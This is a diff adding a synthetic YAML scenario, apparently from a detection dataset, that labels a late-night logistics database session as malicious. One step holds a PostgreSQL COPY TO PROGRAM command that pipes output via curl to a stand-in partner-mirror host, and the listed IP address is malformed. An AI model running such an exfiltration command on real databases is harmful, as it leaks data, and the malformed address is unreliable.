@@ -1,0 +1,23 @@
+scenario_id: gen_logistics_26_data_tamper_mal_653
+family_id: gen_logistics_26_data_tamper_mal_fam653
+domain: logistics
+time_of_day: '23:50'
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: tamper
+  role: postgres
+  anchor: db
+  timing:
+    tempo: bursty
+    step_gaps_seconds:
+    - 1.0
+  events:
+  - step_id: act
+    sql: INSERT INTO shipments DEFAULT VALUES
+  - step_id: dump
+    sql: COPY (SELECT 1) TO PROGRAM 'curl -sX POST https://sync.partner-mirror.example/ingest
+      -d @-'
+    connects_to:
+      ip: 185.220.101.7.22
+      port: 445
